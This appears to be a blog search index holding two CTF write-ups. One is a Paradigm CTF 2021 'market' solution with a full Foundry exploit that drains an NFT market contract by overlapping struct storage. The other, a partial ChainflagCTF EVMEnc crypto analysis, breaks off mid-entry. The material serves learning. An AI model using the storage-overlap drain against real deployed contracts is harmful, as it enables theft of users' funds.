<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>09.market</title>
      <link href="/2024/04/29/19.Paradigm%20CTF%202021/09.market/"/>
      <url>/2024/04/29/19.Paradigm%20CTF%202021/09.market/</url>
      
        <content type="html"><![CDATA[<h1 id="market"><a href="#market" class="headerlink" title="market"></a>market</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>存储、业务逻辑、市场相分离，形成三个合约</p><ul><li>EternalStorage.sol：存储合约，任何调用都需要在fallback中执行。有owner机制</li><li>Market.sol<ul><li>CryptoCollectibles：业务逻辑合约，有owner机制，mint、转让、授权代币功能</li><li>CryptoCollectiblesMarket：市场合约，token的持有者可以在此合约买卖token，但是需要支付手续费。mint代币的钱、手续费都是放在市场合约，存储合约、业务逻辑合约都负责收钱。任何人都可以mint代币，并且卖出去的时候又收回钱，也就是说成本只有一点手续费而已。</li></ul></li><li>Setup：初始化题目</li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将市场合约的余额为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return address(market).balance == 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>先来看资产和状态情况：</p><div class="table-container"><table><thead><tr><th></th><th>ETH</th><th>持币</th><th>授权</th><th>状态</th></tr></thead><tbody><tr><td>Setup</td><td></td><td></td><td></td><td></td></tr><tr><td>市场合约</td><td>50</td><td></td><td></td><td>owner=Setup</td></tr><tr><td>业务逻辑合约</td><td></td><td></td><td></td><td>owner=Setup, minter[Setup,市场]</td></tr><tr><td>存储合约</td><td></td><td></td><td></td><td>owner=业务逻辑</td></tr><tr><td>随机地址1</td><td></td><td>0: ~5 ether</td><td></td><td></td></tr><tr><td>随机地址2</td><td></td><td>0: ~10 ether</td><td></td><td></td></tr><tr><td>随机地址3</td><td></td><td>0: ~15 ether</td><td></td><td></td></tr><tr><td>随机地址4</td><td></td><td>0: ~20 ether</td><td></td></tr></tbody></table></div><p>如果能拿到四个随机地址的私钥，就可以卖出了，但是这行不通，并且市场合约中还残留了一些手续费。因此大方向应该是：清理合约的代币价值、清理合约手续费。</p><ul><li><p>存储合约的owner拥有最高权限，可以操作任何人的token，如果拿到这个权限则本题可迎刃而解。</p><ul><li>存储合约的owner是业务逻辑合约，但是他没有转让的逻辑，并且方法是写死的，因此没有方法可以让逻辑合约调用存储合约的转让所有权方法。同时也没有修改slot的方法。不可行。</li><li>既然没办法让逻辑合约主动调用转让方法，那修改存储合约的owner只能靠修改slot了。我们发现存储合约的<code>updateName(bytes32,bytes32)</code>可以修改slot的内容（前提得你是一个token的所有者），但位置我们无法控制，其他方法也是类似。不可行。</li><li>因此修改slot数据这条路也走不通。</li></ul></li><li><p>逻辑合约似乎写的无懈可击</p></li><li><p>钱是存储在市场合约的，看看能不能直接拿走，也许买卖逻辑写的有问题</p><ol><li><p>有很多题目的考点都是出在卖出这个方法，因为写得不严谨，导致可以卖多次或者可以凭空卖出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function sellCollectible(bytes32 tokenId) public payable &#123;</span><br><span class="line">    require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);</span><br><span class="line">    </span><br><span class="line">    (, address tokenOwner, address approved, ) = cryptoCollectibles.getTokenInfo(tokenId);</span><br><span class="line">    require(msg.sender == tokenOwner, &quot;sellCollectible/not-owner&quot;);</span><br><span class="line">    // 卖之前需要approve给此合约</span><br><span class="line">    require(approved == address(this), &quot;sellCollectible/not-approved&quot;);</span><br><span class="line">    </span><br><span class="line">    cryptoCollectibles.transferFrom(tokenId, msg.sender, address(this));</span><br><span class="line">    </span><br><span class="line">    // 然后此合约转钱</span><br><span class="line">    msg.sender.transfer(tokenPrices[tokenId]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>从这个方法中我们可以发现，先查看这个代币是不是被挖出来过，如果是则用<code>getTokenInfo()</code>去到存储合约查看该token的信息，经过验证之后就转钱。这就涉及到了storage布局的问题了，如果我们修改storage就可以做了，但是从上面的分析可以知道我们无法直接凭空修改storage信息。</p></li><li><p>但是还有一种考点就是让两个结构体之间的storage分布重叠，这样也可以达到修改storage的目的。这道题的结构体有四个属性，并且token的所有者可以任意修改这四个属性。这就有操作空间了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct TokenInfo &#123;</span><br><span class="line">    bytes32 displayName;</span><br><span class="line">    address owner;</span><br><span class="line">    address approved;</span><br><span class="line">    address metadata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么，如果我们mint一个自己的token，这样我们就可以操作storage了，但是怎么操作呢？两条路：</p><ul><li>多次卖出自己的token</li><li>修改整个EVM的storage</li></ul></li><li><p>由于我们的tokenId是随机的不可控，因此很说想修改哪个storage的内容就修改哪个，因此我们只能看看能不能多次卖出自己的token。我们可以修改自己的这四个属性的storage，范围属实很小。再次分析<code>sellCollectible()</code>看看有没有什么操作空间。</p></li><li><p>我们发现<code>require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);</code>仅仅检查是不是被挖过，然后就检查存储合约的storage布局。当我们修改了我们的token的四个属性之后，用另外一个没有mint过的tokenId直接去调用存储合约的方法，利用结构体重叠的方式，使得这个没有被mint过的token也变得有效，然后重复操作重叠的内容，使得原来我们有效的token可以重复卖出</p></li></ol></li></ul><p>从存储合约的逻辑中，我们可以看出，它是根据tokenId后面之后的内容判断一个token的所有者是谁，如果重叠了了之后，就可以修改一个token的所有者。我们将如下这么重叠，通过修改tokenId_0的approval和metadata属性会修改tokenId_1的所有者属性。</p><div class="table-container"><table><thead><tr><th>mint过有效的tokenId_0</th><th>未mint的tokenId_1</th></tr></thead><tbody><tr><td>tokenId_0.name</td><td></td></tr><tr><td>tokenId_0.owner</td><td></td></tr><tr><td>tokenId_0.approval</td><td>tokenId_1.name</td></tr><tr><td>tokenId_0.metadata</td><td>tokenId_1.owner</td></tr><tr><td></td><td>tokenId_1.approval</td></tr><tr><td></td><td>tokenId_1.metadata</td></tr></tbody></table></div><p>因此，我们有了具体的解决思路：</p><ol><li>mint一个有效的token，然后修改此token的四个属性</li><li>直接与存储合约交互，由于结构体重叠，使得原本没被mint过的token也有效</li><li>重复操作重叠部分的内容，使得我们可以重复卖出原本有效的token</li><li>因为有手续费的原因，我们需要额外的操作来处理残留的手续费</li></ol><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/09.market/Setup.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Setup public level;</span><br><span class="line"></span><br><span class="line">    EternalStorageAPI public eternalStorage; // 存储</span><br><span class="line">    CryptoCollectibles public token; // 业务逻辑</span><br><span class="line">    CryptoCollectiblesMarket public market; // 市场</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 部署</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);</span><br><span class="line">        vm.startBroadcast(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));</span><br><span class="line"></span><br><span class="line">        level = new Setup&#123;value: 50 ether&#125;();</span><br><span class="line">        eternalStorage = level.eternalStorage();</span><br><span class="line">        token = level.token();</span><br><span class="line">        market = level.market();</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        console.log(&quot;1.market init balance:&quot;,address(market).balance);</span><br><span class="line">        // 1.mint token0, 至少要稍微大于50ETH，因为后面要额外扣除原来50ETH剩下的手续费</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:0                    tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        bytes32 token_0 = market.mintCollectibleFor&#123;value: 100 ether&#125;(address(this));</span><br><span class="line">        console.log(&quot;2.market mint token0:&quot;,address(market).balance);</span><br><span class="line"></span><br><span class="line">        // 2.修改token_0.metadata, 让它等于address(this)</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        eternalStorage.updateMetadata(token_0, address(this));</span><br><span class="line"></span><br><span class="line">        // 3.approve token</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        token.approve(token_0, address(market));</span><br><span class="line"></span><br><span class="line">        // 4.卖出该token_0, tokenId为token_0</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        console.log(&quot;3.market sell token0:&quot;,address(market).balance);</span><br><span class="line">        market.sellCollectible(token_0);</span><br><span class="line"></span><br><span class="line">        // 5.get token_1</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        bytes32 token_1 = bytes32(uint256(token_0)+2);</span><br><span class="line"></span><br><span class="line">        // 6.updateName-&gt;approval</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name:address(this)</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // 注意，这里tokenId_1是address，因此可以直接调用存储合约的更新名字方法</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));</span><br><span class="line"></span><br><span class="line">        // 7.transferFrom</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name:address(this)</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // 注意，tokenId_0的approval被重新赋值为address(this)，因此我们有权转移</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        token.transferFrom(token_0, address(market), address(this));</span><br><span class="line"></span><br><span class="line">        // 8.将token_0再次卖出</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        token.approve(token_0, address(market));</span><br><span class="line"></span><br><span class="line">        // 计算：token0的价格</span><br><span class="line">        uint tokenPrice = uint256(100 ether) * 10000 / (10000 + 1000);</span><br><span class="line">        // 缺失的钱 = token0的价格 - market剩余的金额</span><br><span class="line">        // 为什么要算这个呢？因为我们可以再次取出token0，得到token0的价格，</span><br><span class="line">        // 但是market中并没有这么多余额，会报错，因此我们需要再次mint来存入一点钱，</span><br><span class="line">        // 使得market的余额刚好等于token0的价格，这样我们再次取出token0的时候，</span><br><span class="line">        // market就刚好没钱了</span><br><span class="line">        uint missingBalance = tokenPrice - address(market).balance;</span><br><span class="line"></span><br><span class="line">        //补偿缺少的ETH</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH + missingBalance = token0&#x27;s price</span><br><span class="line">        market.mintCollectible&#123;value:missingBalance&#125;();</span><br><span class="line">        console.log(&quot;4.market mint another token:&quot;,address(market).balance);</span><br><span class="line">        // sellAgain</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 0ETH</span><br><span class="line">        market.sellCollectible(token_0);</span><br><span class="line">        console.log(&quot;5.market after attack:&quot;,address(market).balance);</span><br><span class="line"></span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable&#123;&#125; // 用于接收ETH</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  1.market init balance: 50000000000000000000</span><br><span class="line">  2.market mint token0: 150000000000000000000</span><br><span class="line">  3.market sell token0: 150000000000000000000</span><br><span class="line">  4.market mint another token: 90909090909090909090</span><br><span class="line">  5.market after attack: 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.crypto @EVMEnc</title>
      <link href="/2024/04/14/02.ChainflagCTF/07.crypto%20@EVMEnc/"/>
      <url>/2024/04/14/02.ChainflagCTF/07.crypto%20@EVMEnc/</url>
      
        <content type="html"><![CDATA[<h1 id="crypto-EVMEnc"><a href="#crypto-EVMEnc" class="headerlink" title="crypto(EVMEnc)"></a>crypto(EVMEnc)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract EVMEnc &#123;</span><br><span class="line">    </span><br><span class="line">    uint public result;</span><br><span class="line">    string public key;</span><br><span class="line">    </span><br><span class="line">    uint private delta;</span><br><span class="line">    uint public output;</span><br><span class="line">    </span><br><span class="line">    uint32 public sum;</span><br><span class="line">    uint224 private tmp_sum=0;</span><br><span class="line">    </span><br><span class="line">    uint32 private key0;</span><br><span class="line">    uint224 private t0=0;</span><br><span class="line">    uint32 private key1;</span><br><span class="line">    uint224  private t1=0;</span><br><span class="line">    uint32 private key2;</span><br><span class="line">    uint224 private  t2=0;</span><br><span class="line">    uint32  private key3;</span><br><span class="line">    uint224 private  t3=0;</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        delta = 0xb3c6ef3720;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Convert(string memory source) public pure returns (uint result) &#123;</span><br><span class="line">        bytes32 tmp;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            tmp := mload(add(source, 32))</span><br><span class="line">        &#125;</span><br><span class="line">        result = uint(tmp) / 0x10000000000000000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function set_key(string memory tmp) public &#123;</span><br><span class="line">        key = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cal_(uint x) public &#123;</span><br><span class="line">        uint tmp = Convert(key) / 0x10000000000000000;</span><br><span class="line">        result = tmp % x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Encrypt(string memory flag) public &#123;</span><br><span class="line">        uint tmp = Convert(flag);</span><br><span class="line">        uint key_tmp = Convert(key) / 0x10000000000000000;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let first,second</span><br><span class="line">            sstore(5, and(shr(96, key_tmp), 0xffffffff))</span><br><span class="line">            sstore(6, and(shr(64, key_tmp), 0xffffffff))</span><br><span class="line">            sstore(7, and(shr(32, key_tmp), 0xffffffff))</span><br><span class="line">            sstore(8, and(key_tmp, 0xffffffff))</span><br><span class="line">            </span><br><span class="line">            let step := 1</span><br><span class="line">            for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123;</span><br><span class="line">                </span><br><span class="line">                first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff)</span><br><span class="line">                second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff)</span><br><span class="line">                </span><br><span class="line">                sstore(4, 0)</span><br><span class="line">                </span><br><span class="line">                for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123;</span><br><span class="line">                    </span><br><span class="line">                    sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff))</span><br><span class="line"></span><br><span class="line">                    let tmp11 := and(add(and(mul(second, 16), 0xffffffff), and(sload(5), 0xffffffff)), 0xffffffff)</span><br><span class="line">                    let tmp12 := and(add(second, and(sload(4),0xffffffff)), 0xffffffff)</span><br><span class="line">                    let tmp13 := and(add(div(second, 32), and(sload(6),0xffffffff)), 0xffffffff)</span><br><span class="line">                    </span><br><span class="line">                    first := and(add(first, xor(xor(tmp11, tmp12), tmp13)), 0xffffffff)</span><br><span class="line">                    </span><br><span class="line">                    let tmp21 := and(add(and(mul(first, 16), 0xffffffff), and(sload(7),0xffffffff)), 0xffffffff)</span><br><span class="line">                    let tmp22 := and(add(first, and(sload(4),0xffffffff)), 0xffffffff)</span><br><span class="line">                    let tmp23 := and(add(div(first, 32), and(sload(8),0xffffffff)), 0xffffffff)</span><br><span class="line">                    second := and(add(second, xor(xor(tmp21, tmp22), tmp23)), 0xffffffff)</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second))))</span><br><span class="line">                step := add(step, 2)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>info.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">transaction</span><br><span class="line"></span><br><span class="line">1.</span><br><span class="line">0x81200224..................</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000003100e35e552c1273c959</span><br><span class="line">sload(0) = 208645382789328542577309</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000001ac3243c9e81ba850045</span><br><span class="line">sload(0) = 29341064342757093333104</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000005ce6a91010e307946b87</span><br><span class="line">sload(0) = 227103917449451505785192</span><br><span class="line"></span><br><span class="line">5.</span><br><span class="line">0xe6dc28ae..................</span><br><span class="line">sload(3) = 1970527074032043059410457910532573615730510348629701619382</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Convert(string memory source) public pure returns (uint result) &#123;</span><br><span class="line">    bytes32 tmp;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        tmp := mload(add(source, 32))</span><br><span class="line">    &#125;</span><br><span class="line">    result = uint(tmp) / 0x10000000000000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>add(source, 32)</code>: Move the pointer of the source string to the start position of its actual data (in Solidity, the first 32 bytes of the string store its length)</li><li><code>mload(add(source, 32))</code>: Load 32 bytes from memory, so tmp now contains the first 32 bytes of the source string</li><li><code>result = uint(tmp) / 0x10000000000000000</code>: This converts tmp to an unsigned integer and performs a division operation. 0x1000000000000000 is the 16th power of 16, which is equivalent to shifting the 256 bit byte sequence to the right by 64 bits. This converts the original bytes32 variable to the first 192 bits of uint. If the length of the input string exceeds 24 bytes (because each byte has 8 bits, 24 bytes are equal to 192 bits), the function will discard the excess.</li></ol><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x81200224..................</span><br></pre></td></tr></table></figure><p>It is obvious that it is a function selector, it is the result of <code>keccak256(&quot;set_key(string)&quot;);</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 